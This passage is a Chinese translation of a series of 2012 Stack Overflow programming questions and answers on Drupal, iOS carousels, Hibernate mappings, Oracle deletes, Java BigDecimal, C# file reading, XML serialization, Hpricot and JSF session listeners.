我读到这个：使用它们的路径指定页面。每行输入一个路径。' *' 字符是通配符。示例路径是博客页面的 blog 和*每个个人博客的 blog/。是首页。如果选择 PHP 选项，请在 . 请注意，执行不正确的 PHP 代码可能会破坏您的 Drupal 站点。

但是当我尝试对我的一个页面做同样的事情时，它就不起作用了。唯一能做的就是前面。我在这里缺少什么吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T15:11:26.050

尝试节点/13

并确保将其设置为“仅在列出的页面上”

在不使用路径别名的情况下，q 的值是您要用于路径的值。

# iphone - 在哪里可以找到这种在 iPad 上制作电子相册的控件

> ID：10603316
> 
> 赞同：0
> 
> 时间：2012-05-15T14:50:01.523
> 
> 标签：iphone, ios, ipad

现在我正在 iPad 上制作电子相册，我想展示这样的照片：

![在此处输入图像描述](../Images/0615d84c975383090fc40fd9a8d9180e.png)

我不知道在哪里可以找到这种控件。有没有人知道或者在一些地方可以找到？真的谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T15:04:26.723

我们使用[iCarousel](https://github.com/nicklockwood/iCarousel)。我已经发布了作者的 github 存储库的链接，因为您似乎在通过 Cocoa Controls 进入时遇到了问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T14:53:17.123

看看这个轮播类：[http ://cocoacontrols.com/platforms/ios/controls/icarousel](http://cocoacontrols.com/platforms/ios/controls/icarousel)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T15:11:11.323

`https://github.com/devinross/tapkulibrary` 你可以用这个库做一个类似coverflow的功能

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-15T14:56:44.953

您可以尝试浏览一下 cocoacontrols.com。在那里搜索coverflow。这个看起来可能是一个很好的起点：[http ://cocoacontrols.com/platforms/ios/controls/icarousel](http://cocoacontrols.com/platforms/ios/controls/icarousel)

# java - 在单个类上休眠不同类型的一对一关系

> ID：10603319
> 
> 赞同：2
> 
> 时间：2012-05-15T14:50:11.037
> 
> 标签：java, hibernate, jpa

我试图找出在休眠中完成关系的最佳方法。我有一个客户对象。每个客户都有一个技术联系人、一个计费联系人和一个销售联系人。每种类型的联系人都具有完全相同的数据结构（电话、电子邮件、地址等）。

我的第一个想法是创建一个Contact 表，然后在Customer 表中有三列——sales_contact、billing_contact、technical_contact。这将在相同的两个表之间建立三个不同的外键一对一关系。但是，我发现这在 Hibernate 中很难映射，至少使用注释。

另一个想法是使其成为多对多关系，并在映射表中有一个类型标志。因此，任何客户都可以有多个联系人（尽管在这种情况下不超过三个），并且任何联系人都可以属于多个客户。不过，我也不知道如何映射那个。会是地图表上的类型字段吗？这个属性会出现在 Contact java 模型对象上吗？Customer 模型是否有一组 Contact 对象。还是三个不同的单独的联系人对象？

所以我真的在这里寻找两件事 - 1.在数据库中实现这一点的最佳方法是什么，以及 2.如何使用注释制作 Hibernate 映射？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:26:43.277

它可以很简单：

```
@Entity
public class Contact {
    @Id
    private String id;
    private String phome;
    private String email;
    private String address;

    // ... Getters and Setters
} 
```

* * *

```
@Entity
public class Customer {

    @Id
    @GeneratedValue
    private String id;

    @ManyToOne
    @JoinColumn(name = "ID")
    private Contact billingContact;

    @ManyToOne
    @JoinColumn(name = "ID")
    private Contact salesContact;

    @ManyToOne
    @JoinColumn(name = "ID")
    private Contact technicalContact;

    public Customer() {
    }

    // ... Getters and Setters
} 
```

* * *

现在，如果您想在对象级别区分*BillingContact*和*SalesContact*，可以将*Contact*抽象化，并使用每种类型的联系人实现它。您必须使用注释父类`@Inheritance`以指定您选择的继承策略（SINGLE_TABLE 在这里听起来很合适，它将使用技术鉴别器列 - 请参阅[http://docs.jboss.org/hibernate/annotations/3.5/reference/ zh/html_single/#d0e1168](http://docs.jboss.org/hibernate/annotations/3.5/reference/en/html_single/#d0e1168)）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-06-11T18:34:26.717

如何使用 @OneToOne 并为每种类型以不同的方式命名 @JoinColumn：

```
@Entity
public class Contact {
     @Id
     private String id;

     private String phone;
     private String email;
     private String address;

     // ... Getters and Setters
}

@Entity
public class Customer {
    @Id
    @GeneratedValue
    private String id;

    @OneToOne(cascade=CascadeType.ALL)
    @JoinColumn(name="billingContact_ID")
    private Contact billingContact;

    @OneToOne(cascade=CascadeType.ALL)
    @JoinColumn(name="salesContact_ID")
    private Contact salesContact;

    @OneToOne(cascade=CascadeType.ALL)
    @JoinColumn(name="technicalContact_ID")
    private Contact technicalContact;

    public Customer() {
    }

    // ....
} 
```

对于 Customer 表中的每一行，应在 Contact 表中创建三行

# sql - 我们如何调整这个删除查询？

> ID：10603321
> 
> 赞同：-1
> 
> 时间：2012-05-15T14:50:17.733
> 
> 标签：sql, oracle, plsql

贾斯汀，根据你的建议，我在这里添加了循环..

无论如何我们可以调整这个程序吗？我还没有测试。

在这里，我们只是从主表和子表中删除 90 天历史记录之前的记录。假设表有超过 20k 条记录要删除。在这里我为每条 5k 记录提交。如果我在这里错了，请告诉我？

```
create or replace 
Procedure PURGE_CLE_ALL_STATUS 
 ( days_in IN number ) 
  IS 
  LV_EXCEPTIONID NUMBER;    
i number := 0;  

cursor s1 is 
        select EXCEPTIONID 
          from EXCEPTIONREC --- master table 
          where TIME_STAMP < (sysdate -days_in); 

BEGIN  

for c1 in s1 loop

     delete from EXCEPTIONRECALTKEY   -- child table 
     where EXCEPTIONID =c1.EXCEPTIONID ; 

     delete from EXCEPTIONREC 
     where EXCEPTIONID =c1.EXCEPTIONID; 

     i := i + 1;              

     if i > 5000 then      
      commit;         
      i := 0;      
     end if;  

end loop;  

commit;      

close S1; 
EXCEPTION 
WHEN OTHERS THEN 
      raise_application_error(-20001,'An error was encountered - '|| 
                                      SQLCODE||' -ERROR- '||SQLERRM); 
END; 
/ 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T15:04:38.303

而不是游标..您可以直接在删除语句中给出条件..

像下面 -

```
create or replace
Procedure PURGE_CLE_ALL_STATUS
 ( days_in IN number )
  IS
  LV_EXCEPTIONID NUMBER;   

BEGIN    

     delete from EXCEPTIONRECALTKEY   -- child table
     where EXCEPTIONID = -- (1)
          (select EXCEPTIONID
          from EXCEPTIONREC --- master table
          where TIME_STAMP < (sysdate -days_in));

     delete from EXCEPTIONREC
     where EXCEPTIONID = --(2)
          (select EXCEPTIONID
          from EXCEPTIONREC --- master table
          where TIME_STAMP < (sysdate -days_in));

commit;     
end if;
close c1;
END;
/ 
```

我完全同意 Justin Cave .. 他给出了很好的观点 .. 如果您从光标中获得多行 .. 您可以使用at (1) 和 (2)`in`来代替。`=`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-10-13T07:30:52.263

> > > “从主表和子表中删除 90 天历史记录之前的记录”

为了获得全部性能优势，您应该实现分区表。当然，这种设计更改可能不会改变您的应用程序。

您的用例是定期删除数据。您尝试创建每日或每周分区，将新数据存储在较新的分区中并定期删除旧分区。

当前的删除方式会遇到性能瓶颈，因为您尝试删除超过 90 天的数据。假设每天有 10,000 条记录，那么到第 90 天将有 90*10000。从 9000 万条记录中定位和删除几条记录总是会很慢并产生其他一些锁定问题。

# php - 页面只能在窗口中打开

> ID：10603327
> 
> 赞同：0
> 
> 时间：2012-05-15T14:50:38.650
> 
> 标签：php, javascript

我在 PHP 中有一个小型应用程序，当单击按钮（`type='button'`而不是`type='submit'`）时，会打开一个新窗口并将页面加载到该窗口中。使用 Ajax 在窗口上的该页面上执行一些到数据库的插入操作。

加载到窗口中的页面只能在窗口中打开。如果该页面的 URL 直接输入到 Web 浏览器的地址栏中，则该页面必须受到保护并重定向到某个其他页面，它可能是应用程序的主页。我尝试使用`window.opener.closed`，但它不适合这个要求。

在 PHP 中，我可以检查

```
if($_SERVER['REQUEST_METHOD'] == "GET")
{
    header("location:Home.php");
} 
```

但这也会将窗口中的页面重定向到 Home.php 页面，因为我在该页面上的`GET`请求上使用了 Ajax。

有没有办法确定页面是否只能加载到窗口中？在所有情况下，都必须防止它被加载。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T14:55:59.760

如果您在常规浏览器地址栏中打开受保护的地址，您是否检查过是否设置了 opener 属性？如果没有，那么您可以在加载窗口时检查它，并在未设置此值时退出

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T14:57:06.200

您可以通过 $_GET 将密钥传递给弹出窗口。如果密钥无效，您将执行远离页面的重定向。这意味着直接访问该页面的用户不会知道密钥。

请记住，在您的标头重定向后也要退出，否则脚本可能会继续处理！

# java - BigDecimal 地板舍入出错

> ID：10603336
> 
> 赞同：2
> 
> 时间：2012-05-15T14:50:56.880
> 
> 标签：java, bigdecimal, rounding

我最近问了一个关于奇怪的 java double floor rounding 的问题，并得到了使用 BigDecimals 的答案，所以尝试了以下代码：

```
BigDecimal velocity = new BigDecimal(-0.07);
BigDecimal afterMultiplyingBy200 = velocity.multiply( new BigDecimal(200.0) );
BigDecimal floored = afterMultiplyingBy200.setScale(0, RoundingMode.FLOOR);
System.out.println("After multiplication " + afterMultiplyingBy200);
System.out.println("floored value is " + floored); 
```

我得到以下结果

```
After multiplication -14.000000000000001332267629550187848508358001708984375000
floored value is -15 
```

似乎即使使用 BigDecimal 我也无法将 -0.07 乘以 200 得到正确的值，有什么办法可以准确地得到 -14.0？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-15T14:54:30.217

从我对那个问题的回答：

> 当代码被编译或解释时，你的“0.1”已经被四舍五入到该格式中最接近的数字，这会在计算发生之前导致一个小的舍入误差。

问题是`new BigDecimal(-0.07);`使用`double`文字来初始化`BigDecimal`- 所以错误仍然发生。使用`BigDecimal`采用 a 的构造函数`String`。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-15T14:55:13.560

您应该使用[字符串构造函数](http://docs.oracle.com/javase/7/docs/api/java/math/BigDecimal.html#BigDecimal%28java.lang.String%29)来避免由于使用双精度数而导致的舍入错误：

```
BigDecimal velocity = new BigDecimal("-0.07");
BigDecimal afterMultiplyingBy200 = velocity.multiply(new BigDecimal("200")); 
```

[使用双精度的构造函数](http://docs.oracle.com/javase/7/docs/api/java/math/BigDecimal.html#BigDecimal%28double%29)的 Javadoc 提取- 强调我的：

> 1.  此构造函数的结果可能有些不可预测。有人可能会假设用 Java 编写 new BigDecimal(0.1) 会创建一个正好等于 0.1 的 BigDecimal（未缩放的值 1，缩放为 1），但它实际上等于 0.1000000000000000055511151231257827021181583404541015625。这是因为 0.1 不能完全表示为双精度数（或者，就此而言，不能表示为任何有限长度的二进制分数）。因此，传递给构造函数的值并不完全等于 0.1，尽管看起来如此。
> 2.  另一方面，String 构造函数是完全可预测的：编写 new BigDecimal("0.1") 会创建一个正好等于 0.1 的 BigDecimal，正如人们所期望的那样。因此，**一般建议**优先使用 String 构造函数。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-05-15T14:54:12.117

问题就在这里：

```
BigDecimal velocity = new BigDecimal(-0.07); 
```

`-0.07`不能完全表示为 a `double`，因此传递给`BigDecimal`构造函数的文字值最终与 . 略有不同`-0.07`。`BigDecimal`只需采用该近似值并使用它运行，即可产生您所看到的结果。

尝试：

```
BigDecimal velocity = new BigDecimal(-7, 2);
BigDecimal afterMultiplyingBy200 = velocity.multiply( new BigDecimal(2, -2) ); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2018-03-28T14:36:31.663

根据[文档](https://docs.oracle.com/javase/10/docs/api/java/math/BigDecimal.html#ROUND_FLOOR)，`ROUND_FLOOR`向负无穷大四舍五入，因此四舍五入`-14.000...`为`-15`.

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-15T14:54:16.823

你应该看看[RoundingMode](http://docs.oracle.com/javase/1.5.0/docs/api/java/math/RoundingMode.html)，尤其是`HALF_UP`。

# c# - 使用 OnSelectedIndexChanged 自动打开一个 txt 文件

> ID：10603338
> 
> 赞同：0
> 
> 时间：2012-05-15T14:51:06.147
> 
> 标签：c#, .net-3.5

我要做的是使用 OnSelectedIndexChange 方法自动将文件读入richTextBox。没有任何错误，它只是完全不起作用。这是我正在使用的代码

```
 public void comboBox1_OnSelectedIndexChanged(object sender, EventArgs e)
    {
        string selectedPath = comboBox1.SelectedItem.ToString();
        if (File.Exists(@"C:\\Mavro\\MavBridge\\" + selectedPath + "\\ " + "Comment" + ".txt"))
        {
            try
            {
                Thread.Sleep(0500);
                System.IO.StreamReader textFile = new System.IO.StreamReader(@"C:\\Mavro\\MavBridge\\" + selectedPath + "\\ " + "Comment" + ".txt");
                richTextBox1.Text = textFile.ReadToEnd();
                textFile.Close();
            }
            catch
            {                
                MessageBox.Show("Error: File cannot be opened!", "Error");
            }
        }
        else
        {
            MessageBox.Show("No comment was found in this folder", "Alert");
        }
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-16T18:03:14.517

只是为了好玩，让你尝试一下。首先，替换以下行：

```
if (File.Exists(@"C:\\Mavro\\MavBridge\\" + selectedPath + "\\ " + "Comment" + ".txt")) 
```

有了这个：

```
if(File.Exists(string.Format("C:\\Mavro\\MavBridge\\{0}\\Comment.txt", selectedPath))) 
```

看起来你有一个额外的空间 ( `"\\ " + "Comment"`)，所以我确定这就是它永远不会命中这段代码的原因。此外，只要您有一个需要关闭/处置的对象，它通常会实现 IDisposable，这意味着您应该将对象封装在一个`using`块中：

```
Thread.Sleep(0500);
try
{
    using(System.IO.StreamReader textFile = new System.IO.StreamReader(string.Format("C:\\Mavro\\MavBridge\\{0}\\Comment.txt", selectedPath)))
    {
        richTextBox1.Text = textFile.ReadToEnd();
    }

}
catch
{                
    MessageBox.Show("Error: File cannot be opened!", "Error");
} 
```

但是，这可以通过完全绕过 StreamReader 并使用 System.IO.File.ReadAllText 来进一步简化：

```
richTextBox1.Text = System.IO.File.ReadAllText(string.Format("C:\\Mavro\\MavBridge\\{0}\\Comment.txt", selectedPath)); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T14:56:41.900

好吧，一个问题来自您拥有的事实：

`@"C:\\Mavro\\MavBridge\\" + selectedPath + "\\ " + "Comment" + ".txt"`

由于您使用的是逐字字符串（开头的**@**），因此您不需要添加双斜杠。

其余的，请确保您的文件存在。

稍后编辑：我也不确定你是否匆忙复制/粘贴或类似的东西，但你真的把`catch`块**放在里面**了`try`吗？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-15T14:57:22.623

1）你看到的错误是什么？

2）您确定该文件存在吗？

3）您确定您的代码创建的路径是您期望的路径吗？

4）你为什么要睡线程？

5) 为什么不只使用[File.ReadAllText](http://msdn.microsoft.com/en-us/library/system.io.file.readalltext)？

6)如果代码以无权访问文件的权限运行，即使文件确实存在，[File.Exists也会返回 false。](http://msdn.microsoft.com/en-us/library/system.io.file.exists.aspx)您的代码运行的用户是否有权限？

> 如果调用者具有所需的权限并且路径包含现有文件的名称，则为 true；否则为假。如果 path 为 null、无效路径或长度为零的字符串，此方法也会返回 false。如果调用者没有足够的权限来读取指定的文件，则不抛出异常，并且无论路径是否存在，该方法都返回 false。

和

> 如果在尝试确定指定文件是否存在时发生任何错误，Exists 方法将返回 false。这可能发生在引发异常的情况下，例如传递包含无效字符或过多字符的文件名、磁盘故障或丢失，或者调用者没有读取文件的权限。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-15T14:59:31.460

在每个字符串之前去掉 @ 。您当前的目录使用实际的双斜杠而不是 C:\Mavro\MavBridge。在开头使用带有 \ 的单斜杠或使用 @，但不要同时使用两者。

另外，我强烈建议使用 Path.Combine 而不是像那样将片段连接在一起。

# hibernate - 无法在 @Embedded 上使用属性访问权限

> ID：10603339
> 
> 赞同：0
> 
> 时间：2012-05-15T14:51:08.587
> 
> 标签：hibernate, components

我无法在 @Embedded 字段上使用属性访问。

我的类注释如下：

```
@Entity
@Table(name = "digitization_order")
public class Order {

@Id
@GeneratedValue(strategy = GenerationType.IDENTITY)
private long id;

//mapping on getter
private OrderImageData imageData;

@ManyToOne
@JoinColumn(name = "scanner_id")
private Scanner scanner;

public Order() {
}

public long getId() {
    return id;
}

@Embedded
@Access(AccessType.PROPERTY)
public OrderImageData getImageData() {
    return imageData;
} 
```

[...]

```
@Embeddable
public class OrderImageData {

@Column(name="controller_revision_no")
private Long controllerRevisionNo;

@OneToMany(cascade = CascadeType.ALL)
@JoinColumn(name = "order_id")
@OrderColumn(name = "content_order")
private List<OrderContent> contents = new ArrayList<OrderContent>(); 
```

[...]

```
@Entity
@Table(name = "order_content")
public class OrderContent {

@Id
@GeneratedValue(strategy = GenerationType.IDENTITY)
private long id;

@Column(name = "uuid")
private String uuid;

@ElementCollection(fetch = FetchType.EAGER)
@CollectionTable(name = "comment")
@OrderColumn(name = "comment_order")
@JoinColumn(name = "order_content_id")
private List<Comment> comments = new ArrayList<Comment>();

private boolean faulty;

private OrderContent() {
} 
```

[...]

```
@Embeddable
public class Comment {
private CommentType commentType;

private String comment;

private Date date;

private long revisionNo;

//JPA
private Comment() {
} 
```

所有类都有公共访问器，无参数构造器；

当部署应用程序/当休眠正在创建数据库模式时 - 我得到以下异常：

```
org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'sessionFactory' defined in class path resource [Hibernate-Spring.xml]: Invocation of init method failed; nested exception is org.hibernate.MappingException: Could not determine type for: java.util.List, at table: digitization_order, for columns: [org.hibernate.mapping.Column(contents)]
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1455)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:519)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:456)
    at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:294)
    at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:225)
    at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:291)
    at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:193)
    at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:567)
    at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:913)
    at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:464)
    at org.springframework.web.context.ContextLoader.configureAndRefreshWebApplicationContext(ContextLoader.java:384)
    at org.springframework.web.context.ContextLoader.initWebApplicationContext(ContextLoader.java:283)
    at org.springframework.web.context.ContextLoaderListener.contextInitialized(ContextLoaderListener.java:111)
    at org.apache.catalina.core.StandardContext.listenerStart(StandardContext.java:4600)
    at org.apache.catalina.core.StandardContext$1.call(StandardContext.java:5097)
    at org.apache.catalina.core.StandardContext$1.call(StandardContext.java:5092)
    at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:334)
    at java.util.concurrent.FutureTask.run(FutureTask.java:166)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
    at java.lang.Thread.run(Thread.java:636)
Caused by: org.hibernate.MappingException: Could not determine type for: java.util.List, at table: digitization_order, for columns: [org.hibernate.mapping.Column(contents)]
    at org.hibernate.mapping.SimpleValue.getType(SimpleValue.java:306)
    at org.hibernate.tuple.PropertyFactory.buildStandardProperty(PropertyFactory.java:143)
    at org.hibernate.tuple.component.ComponentMetamodel.<init>(ComponentMetamodel.java:68)
    at org.hibernate.mapping.Component.buildType(Component.java:184)
    at org.hibernate.mapping.Component.getType(Component.java:177)
    at org.hibernate.mapping.SimpleValue.isValid(SimpleValue.java:290)
    at org.hibernate.mapping.Property.isValid(Property.java:217)
    at org.hibernate.mapping.PersistentClass.validate(PersistentClass.java:463)
    at org.hibernate.mapping.RootClass.validate(RootClass.java:235)
    at org.hibernate.cfg.Configuration.validate(Configuration.java:1332)
    at org.hibernate.cfg.Configuration.buildSessionFactory(Configuration.java:1835)
    at org.springframework.orm.hibernate3.LocalSessionFactoryBean.newSessionFactory(LocalSessionFactoryBean.java:860)
    at org.springframework.orm.hibernate3.LocalSessionFactoryBean.buildSessionFactory(LocalSessionFactoryBean.java:779)
    at org.springframework.orm.hibernate3.AbstractSessionFactoryBean.afterPropertiesSet(AbstractSessionFactoryBean.java:211)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1514)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1452)
    ... 20 more 
```

将 imageData 上的访问权限更改为 FIELD 后，堆栈跟踪消失（将注释从 getter 移动到字段后）

任何想法为什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:00:38.637

不确定，但可以从放置在方法上`OrderImageData`的注释继承其访问类型。因此，Hibernate 将查找有关此类属性的映射详细信息，但找不到任何内容，从而导致此异常。`@Access(AccessType.PROPERTY)``getImageData()`

尝试上课`@Access(AccessType.FIELD)`。`OrderImageData`

# javascript - jQuery 中的跨域请求仅适用于某些文件

> ID：10603341
> 
> 赞同：1
> 
> 时间：2012-05-15T14:51:18.577
> 
> 标签：javascript, jquery, ajax, api

我正在尝试使用 javascript 和 jQuery 访问 API，但出现了一个奇怪的错误。

```
$(document).ready(function() {
    var server = 'https://' + rand(10) + '.spotilocal.com:4371';
    $.getJSON(
        server + "/service/version.json?service=remote&_=" + new Date().getTime(),
        function(data) {
            if (data.version == 9) {
                $.getJSON(
                    server + "/simplecsrf/token.json?&cors=&_=" + new Date().getTime(),
                    function(data) {
                        console.log(data.toString());
                });
            }
    });

    function rand(length,current){
        // returns a random string
    }   
}); 
```

我的错误：

```
XHR finished loading: "https://rwhpxmubmi.spotilocal.com:4371/service/version.json?service=remote&_=1337093238805".
XMLHttpRequest cannot load https://rwhpxmubmi.spotilocal.com:4371/simplecsrf/token.json?&cors=&_=1337093239623\. Origin http://example.com is not allowed by Access-Control-Allow-Origin. 
```

第一个请求成功，但第二个请求失败。但是这两个文件都在同一台服务器上，并且两个文件都是 JSON。

有谁知道我为什么会收到此错误以及如何解决？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T14:55:09.993

您必须编辑文件的标题。其中一个显然正确设置了 Access-Origin，而另一个则没有。

看看这个[页面](http://enable-cors.org/)。

# ruby - 在 Ruby 中播放频率特定的音调

> ID：10603343
> 
> 赞同：4
> 
> 时间：2012-05-15T14:51:21.410
> 
> 标签：ruby, macos, audio

我可以使用哪些库/宝石在带有 Ruby 的 Mac 上生成特定频率/持续时间的音调？

# c#-4.0 - XML 序列化和反序列化

> ID：10603347
> 
> 赞同：0
> 
> 时间：2012-05-15T14:51:30.397
> 
> 标签：c#-4.0

我从服务器收到一个 XML 文件，其中包含许多元素和一个属性。

当尝试对 xml 进行序列化/反序列化时，所有元素都已正确序列化/反序列化，但属性除外。为什么会这样？

这是 XML 文件：

```
"<msg><msisdn>123456789</msisdn><sessionid>535232573</sessionid><phase>2</phase><request type=\"1\">*120*111#</request></msg>" 
```

和班级：

```
[Serializable]
[XmlRoot(ElementName = "msg", Namespace = "")]
public class myClass
{
    [XmlElement(ElementName = "msisdn")]
    public string number = string.Empty;
    [XmlElement(ElementName = "sessionid")]
    public string sessionID = string.Empty;
    [XmlAttribute(AttributeName = "type")]
    public string requestType = string.Empty;
    [XmlElement(ElementName = "request")]
    public string request = string.Empty;
    [XmlElement(ElementName = "phase")]
    public string phase = string.Empty;

    public override string ToString()
    {
        return number + " - " + sessionID;
    }
} 
```

谢谢你的帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T14:58:40.953

尝试为 request 定义一个子类，因为它是 root 的而不是 root 的`type`属性：`request``MyClass`

```
[XmlRoot(ElementName = "msg", Namespace = "")]
public class MyClass
{
    [XmlElement(ElementName = "msisdn")]
    public string Number { get; set; }

    [XmlElement(ElementName = "sessionid")]
    public string SessionID { get; set; }

    [XmlElement(ElementName = "request")]
    public Request Request { get; set; }

    [XmlElement(ElementName = "phase")]
    public string Phase { get; set; }

    public override string ToString()
    {
        return Number + " - " + SessionID;
    }
}

public class Request
{
    [XmlAttribute(AttributeName = "type")]
    public string Type { get; set; }

    [XmlText]
    public string Value { get; set; }
}

class Program
{
    static void Main()
    {
        var serializer = new XmlSerializer(typeof(MyClass));
        using (var stringReader = new StringReader("<msg><msisdn>123456789</msisdn><sessionid>535232573</sessionid><phase>2</phase><request type=\"1\">*120*111#</request></msg>"))
        using (var xmlReader = XmlReader.Create(stringReader))
        {
            var obj = (MyClass)serializer.Deserialize(xmlReader);
            Console.WriteLine(obj.Request.Type);
        }
    }
} 
```

# ruby - 如何在 Hpricot 中追加一个新节点

> ID：10603353
> 
> 赞同：0
> 
> 时间：2012-05-15T14:52:04.410
> 
> 标签：ruby, hpricot

我有一个 DOM，我想使用 Hpricot 插入一个新节点。这是我的DOM结构：

```
<html>
  <head>
  </head>
  <body>
    ...
    ...

  </body>
</html> 
```

我想要的是我必须插入一个脚本标签作为最后一个孩子`<body>`：

```
<body>
  ...
  <script>
    console.log(document.cookie)
  </script>
</body> 
```

这就是我所拥有的：

```
doc = Hpricot.XML(%{<html>
                     <head>
                      </head>
                      <body>
                        ...
                        ...
                      </body>
                    </html>
                   })

doc.at('body') 
```

但是现在我没有得到任何想要的方法来前进，并且 hpricot 的文档很糟糕。有没有人这样做过？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T09:10:52.617

已实现，但如果有人想这样做，请使用 Nokigiri 粘贴它

这里的 HTML

```
 h1 = Nokogiri::XML.parse %{<html>
      <head>
          <script>
            alert("hello");
          </script>
      </head>
      <body>
        <p> THIS IS WAR </p>
      </body>
    </html>} 
```

将您的标签（我的案例脚本标签）附加为正文的最后一个孩子

```
h1.search('body').children.after(%{<script> alert ('Hello') </script>}) 
```

希望这对一些人有帮助

# loadrunner - 如何在 HP Performance Center 中编辑上传的脚本？

> ID：10603356
> 
> 赞同：1
> 
> 时间：2012-05-15T14:52:10.453
> 
> 标签：loadrunner

我正在使用 LoadRunner 工具对在 Sharepoint 中开发的 Web 应用程序执行性能测试。我已经录制了脚本并测试了脚本。

我已在 Performance Center 中上传脚本以进行负载测试。但是，问题是我有一些参数，如 URL，在性能中心运行脚本之前必须更改这些参数。如何在性能中心编辑参数值。我们是否有任何选项可以在性能中心本身编辑脚本，或者我们必须下载脚本，编辑它然后再次上传。

请帮我解决一下这个。

谢谢，

乌德海。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-05T20:57:13.493

无法在性能中心编辑脚本。您可以做的一件事是将 Vugen 与性能中心同步并打开脚本并对其进行编辑并保存。

此选项可以在加载运行器的工具菜单中找到。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-11T07:57:57.850

您还可以使用以下代码确定您是在 Controller 还是 VuGen 下运行：

```
int function isVuGen()
{
    // Check if we are running under VuGen
    //
    // Returns
    //   0  = Under Controller
    //   1  = Under VuGen

    if (strcmp(lr_get_master_host_name(),"None") == 0) return = 1; // VuGen

    return 0; // Controller
} 
```

# java - 从 Session Listener 访问和修改 Application-Scoped Managed Bean 的属性

> ID：10603357
> 
> 赞同：0
> 
> 时间：2012-05-15T14:52:11.097
> 
> 标签：java, jsf, jakarta-ee, jsf-2

我需要访问应用程序范围的托管 bean 以从 HttpSessionListener 中修改某些属性。

我已经使用了以下内容：

```
@Override
public void sessionDestroyed(HttpSessionEvent se) {
    HttpSession session = se.getSession();
    User user = userService.findBySessionId(session.getId());    

    ExternalContext externalContext = FacesContext.getCurrentInstance().getExternalContext();

     ApplicationScopedBean appBean = (ApplicationScopedBean) externalContext.getApplicationMap().get("appBean");

     appBean.getConnectedUsers().remove(user);
} 
```

externalContext = FacesContext.getCurrentInstance().getExternalContext() 已经在这里导致了一个空指针异常，即使它没有，我也不确定 appBean 是否可以通过上述方式访问。

有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T16:38:37.323

仅在`FacesContext`服务于由调用`FacesServlet`. 在会话销毁期间，不一定意味着 HTTP 请求。会话通常由容器管理的后台线程销毁。这不会通过`FacesServlet`. 因此，您不应期望`FacesContext`在会话销毁期间始终存在。仅当您`session.invalidate()`在 JSF 托管 bean 内部调用时，`FacesContext`它才可用。

如果您的应用程序范围的托管 bean 由 JSF 管理`@ManagedBean`，那么很高兴知道 JSF 将其作为`ServletContext`. 反过来`ServletContext`在会话监听器中可用[`HttpSession#getServletContext()`](http://docs.oracle.com/javaee/6/api/javax/servlet/http/HttpSession.html#getServletContext%28%29)。

所以，这应该这样做：

```
@Override
public void sessionDestroyed(HttpSessionEvent se) {
    HttpSession session = se.getSession();
    User user = userService.findBySessionId(session.getId());    
    ApplicationScopedBean appBean = (ApplicationScopedBean) session.getServletContext().getAttribute("appBean");
    appBean.getConnectedUsers().remove(user);
} 
```

如果您正在运行支持 Servlet 3.0 的容器，则另一种方法是让您的应用程序范围的 bean 实现`HttpSessionListener`并在构造时将其自身注册。这样您就可以直接引用该`connectedUsers`属性。

```
@ManagedBean
@ApplicationScoped
public class AppBean implements HttpSessionListener {

    public AppBean() {
        ServletContext context = (ServletContext) FacesContext.getCurrentInstance().getExternalContext().getContext();
        context.addListener(this);
    }

    @Override
    public void sessionDestroyed(HttpSessionEvent se) {
        HttpSession session = se.getSession();
